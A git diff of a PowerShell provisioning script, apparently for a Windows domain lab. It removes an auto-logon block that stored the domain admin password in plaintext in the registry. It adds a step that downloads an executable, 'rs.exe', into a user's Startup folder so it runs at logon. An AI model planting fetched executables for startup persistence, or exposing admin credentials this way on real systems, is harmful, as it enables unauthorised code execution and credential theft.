@@ -566,22 +566,6 @@ $domainJoinScript = @"
 `$securePassword = ConvertTo-SecureString '$domainAdminPassword' -AsPlainText -Force
 `$credential = New-Object System.Management.Automation.PSCredential('$domainAdminUser', `$securePassword)
 
-# Variables
-`$CandiceUsername = "candice.kevin"
-
-
-# Registry paths
-`$autoLogonKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
-
-# Set registry values for auto-logon
-Set-ItemProperty -Path `$autoLogonKey -Name "DefaultUserName" -Value "`$CandiceUsername"
-Set-ItemProperty -Path `$autoLogonKey -Name "DefaultDomainName" -Value "odomain.local"
-Set-ItemProperty -Path `$autoLogonKey -Name "DefaultPassword" -Value "$domainAdminPassword"
-Set-ItemProperty -Path `$autoLogonKey -Name "AutoAdminLogon" -Value "1"
-
-Write-Output "Auto-logon enabled for $domainName\`$CandiceUsername."
-
-
 # Join the server to the domain
 Add-Computer -DomainName '$domainName' -Credential `$credential -Restart -Force
 "@
@@ -1164,7 +1148,7 @@ $w10script=@"
 `$ExeName     = "rs.exe"
 `$UserName    = "$CandiceUserName"
 `$Password    = "$adminPassword"
-
+`$startupFolder = "C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
 # Drop a small PowerShell script on disk (C:\Temp\DownloadStartup.ps1)
 
@@ -1207,6 +1191,13 @@ if (!(Test-Path "C:\Temp")) {
 # Write the download script to disk
 `$downloadScriptPath = "C:\Temp\DownloadStartup.ps1"
 Set-Content -Path `$downloadScriptPath -Value `$downloadScript -Force -Encoding UTF8
+
+
+# Download rs.exe directly to the Startup file path to avoid profile activation delays
+`$destination = Join-Path `$startupFolder `$ExeName
+Invoke-WebRequest -Uri `$DownloadUrl -OutFile `$destination
+
+
 
 # -----------------------
 # STEP 1: Add P/Invoke definitions
